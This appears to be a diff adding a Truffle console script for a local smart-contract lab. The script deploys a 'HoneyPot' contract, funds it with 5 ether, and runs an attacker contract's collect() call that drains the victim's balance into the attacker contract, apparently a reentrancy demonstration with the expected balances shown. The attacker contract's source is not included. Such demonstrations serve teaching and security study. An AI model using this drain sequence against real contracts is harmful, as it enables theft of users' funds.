@@ -1,0 +1,41 @@
+﻿Commands to be executed in TRUFFLE CONSOLE after deploying the contracts.
+
+## stores HoneyPot contract address in variable “honeyPotAddress”
+HoneyPot.deployed().then(instance => honeyPotAddress = instance.address)
+
+## returns balance in HoneyPot
+await web3.eth.getBalance(honeyPotAddress)
+    ## displays ‘0’
+
+## send money from first account in the n/w to the HoneyPot contract
+web3.eth.getAccounts().then( function(s){FirstA=s[0]})
+ 
+HoneyPot.deployed().then(instance => instance.put({from: FirstA, value: web3.utils.toWei('5', "ether") }))
+
+## check the balance of HoneyPot
+await web3.eth.getBalance(honeyPotAddress)
+     ## displays '5000000000000000000'
+
+## Get attackers contract address
+HoneyPotCollect.deployed().then(instance => evilContractAddress = instance.address)
+
+## check its balance
+await web3.eth.getBalance(evilContractAddress)
+    ## displays ‘0’
+
+##Attack HoneyPot contract with evil contract
+
+HoneyPotCollect.deployed().then(inst => inst.collect({ value: web3.utils.toWei('5', "ether"), gas: 1000000 }))
+
+## check the money in the attacker account and HoneyPot(victim) account
+	await web3.eth.getBalance(honeyPotAddress)
+    ## displays ‘0’
+	await web3.eth.getBalance(evilContractAddress)
+	## displays '5000000000000000000'
+   
+
+##To kill the attacker account
+
+HoneyPotCollect.deployed().then(inst => inst.kill())
+
+
